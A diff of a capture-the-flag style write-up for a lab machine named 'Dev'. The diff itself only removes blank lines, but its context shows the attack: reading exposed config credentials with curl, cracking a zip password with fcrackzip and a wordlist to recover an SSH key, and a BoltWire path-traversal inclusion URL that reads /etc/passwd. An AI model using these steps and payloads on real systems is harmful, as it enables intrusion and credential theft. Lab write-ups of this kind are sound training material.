@@ -2,7 +2,6 @@
 title: "Dev"
 ---
 
-
 ## Enumeration <a href="#ennumeration" id="ennumeration"></a>
 
 ```
@@ -110,7 +109,6 @@ curl 10.0.2.8/app/config/config.yml |grep -A 2 username:                        
 100 21075  100 21075    0     0  20.3M      username: bolt
     0 -    password: I_love_java
 
-
  username: bolt
  password: I_love_java
 ```
@@ -154,7 +152,6 @@ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
 found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
 found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)
 
-
 PASSWORD FOUND!!!!: pw == java101
                                 
 ```
@@ -182,7 +179,6 @@ Archive:  save.zip
 BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                | php/webapps/36552.txt
 BoltWire 6.03 - Local File Inclusion                                                                                       | php/webapps/48411.txt
 --------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-
 
 1) Using HTTP GET request browse to the following page, whilst being authenticated user.
 http://192.168.51.169/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd
